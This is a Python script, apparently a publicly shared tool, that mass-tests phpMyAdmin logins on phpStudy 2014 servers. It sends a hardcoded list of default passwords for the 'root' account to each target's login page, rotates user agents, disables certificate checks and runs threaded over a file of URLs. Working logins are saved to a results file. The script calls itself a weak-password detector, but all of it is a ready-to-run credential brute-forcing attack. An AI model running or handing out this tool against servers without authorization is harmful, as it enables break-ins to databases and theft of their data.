import argparse
import requests
import concurrent.futures
import sys
import random
import time

# Configuration
USERNAMES = ['root']
PASSWORDS = ['123456', '111111', 'root']
MAX_RETRIES = 3
TIMEOUT = 5

def read_user_agents(filename='user-agents.txt'):
    """Read user agents from a file and return a random choice."""
    with open(filename, 'r') as f:
        useragents = [line.strip() for line in f.readlines()]
    return random.choice(useragents)

def test_credentials(url, username, password):
    """Attempt to login with the provided credentials."""
    data = {
        "pma_username": username,
        "pma_password": password,
        "server": "1",
    }
    headers = {'User-Agent': read_user_agents()}

    try:
        response = requests.post(url, data=data, headers=headers, verify=False,
                                 allow_redirects=True, timeout=TIMEOUT)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def bao(url):
    """Perform brute force login attempts."""
    url += '/phpmyadmin/index.php'

    for username in USERNAMES:
        for password in PASSWORDS:
            response = test_credentials(url, username, password)

            if response and response.status_code == 200 and 'phpMyAdmin phpStudy 2014' in response.text:
                print(f'\033[1;31m[+] {url} Login Success! username: {username} & password: {password}\033[0m')
                with open('results.txt', 'a') as f:
                    f.write(f"{url} username: {username} & password: {password}\n")
                return  # Exit upon successful login
            else:
                print(f'[-] {url} Login failed for username: {username} & password: {password}')

def pl(filename):
    """Load URLs from a file."""
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f.readlines()]

def help():
    """Display help information."""
    helpinfo = """
               __                                    __          ____      
    ____  / /_  ____  ____ ___  __  ______ _____/ /___ ___  ( __ )____ 
   / __ \/ __ \/ __ \/ __ `__ \/ / / / __ `/ __  / __ `__ \/ __  / __ \
  / /_/ / / / / /_/ / / / / / / /_/ / /_/ / /_/ / / / / / / /_/ / / / /
 / .___/_/ /_/ .___/_/ /_/ /_/\__, /\__,_/\__,_/_/ /_/ /_/\____/_/ /_/ 
/_/         /_/              /____/                                    

                                               
"""
    print(helpinfo)
    print("phpmyadmin2014".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com for single target detection")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt for batch target detection")
    print(f"[+]{sys.argv[0]} -h --help for more information")
    print("Written by YZX100")

def main():
    parser = argparse.ArgumentParser(description='phpmyadmin2014 weak password detection script')
    parser.add_argument('-u', '--url', type=str, help='Single target URL')
    parser.add_argument('-f', '--file', type=str, help='Batch detection file')
    parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads (default: 5)')
    args = parser.parse_args()

    if args.url:
        bao(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.thread) as executor:
            executor.map(bao, urls)
    else:
        help()

if __name__ == '__main__':
    main()